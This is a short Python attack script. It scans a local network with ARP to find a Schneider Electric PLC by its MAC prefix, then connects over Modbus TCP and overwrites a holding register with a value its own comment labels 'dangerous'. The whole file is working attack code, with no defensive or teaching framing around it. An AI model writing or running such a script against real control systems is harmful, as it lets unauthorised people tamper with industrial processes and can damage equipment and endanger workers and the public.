from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient
import time

# Target network in CIDR notation (Modify based on your network)
NETWORK_RANGE = "192.168.1.0/24"

# Modbus parameters (Example: holding register storing a time duration)
MODBUS_PORT = 502
REGISTER_ADDRESS = 10  # Modify this based on the PLC parameter to change
NEW_VALUE = 999  # Dangerous value to set

def find_plc_ip():
    """Scans network to find the Schneider Electric PLC based on its MAC address."""
    print("[+] Scanning network for Schneider Electric PLC...")

    # Generate an ARP request
    arp = ARP(pdst=NETWORK_RANGE)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    # Send the request and receive responses
    result = srp(packet, timeout=3, verbose=False)[0]

    for sent, received in result:
        if "00:80:F4" in received.hwsrc.upper():  # OUI for Schneider Electric
            print(f"[+] PLC found at IP: {received.psrc}")
            return received.psrc

    print("[-] No PLC found.")
    return None

def modify_plc_parameter(plc_ip):
    """Connects to the PLC and modifies a specified Modbus register."""
    print(f"[+] Connecting to PLC at {plc_ip}...")
    client = ModbusTcpClient(plc_ip, port=MODBUS_PORT)

    if not client.connect():
        print("[-] Failed to connect to PLC.")
        return

    print(f"[+] Modifying parameter at register {REGISTER_ADDRESS} to value {NEW_VALUE}...")
    response = client.write_register(REGISTER_ADDRESS, NEW_VALUE)

    if response.isError():
        print("[-] Failed to modify parameter.")
    else:
        print("[+] Parameter modified successfully!")

    client.close()

# Start process
plc_ip = find_plc_ip()
if plc_ip:
    modify_plc_parameter(plc_ip)